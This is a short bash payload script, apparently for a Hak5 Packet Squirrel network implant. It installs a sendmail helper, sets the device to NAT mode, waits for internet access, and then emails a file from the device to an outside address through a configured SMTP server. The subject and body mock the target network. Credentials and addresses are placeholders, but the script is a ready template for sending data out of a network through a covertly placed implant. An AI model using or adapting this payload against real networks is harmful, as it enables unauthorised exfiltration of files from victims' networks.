#!/bin/bash

function run() {
   LED STAGE1
   SWITCH_POS=$(SWITCH)
   until ping -c 1 8.8.8.8 >/dev/null ; do : ; done
   SUBJECT='Im Just Nutty'
   BODY='And your network is nutty too.'
   RCPT="recieving email"
   FROM="your email"
   SERVER="server.com"
   USER="username"
   PASS="password"
   FILE="/some/File/Path/1.txt"
   SENDMAIL $FROM $RCPT "$SUBJECT" "$BODY" $SERVER $USER $PASS "$FILE"
   ####### REMOVE THE FILE VAR FROM THE PYTHON COMMAND IF YOU HAVE NO PATH
   LED FINISH
}


if [ ! -f /usr/bin/SENDMAIL ]; then
    mv /root/payloads/$(SWITCH)/sendemail.py /usr/bin/
    mv /root/payloads/$(SWITCH)/SENDMAIL /usr/bin/
    chmod +rx /usr/bin/SENDMAIL
fi

NETMODE NAT
run
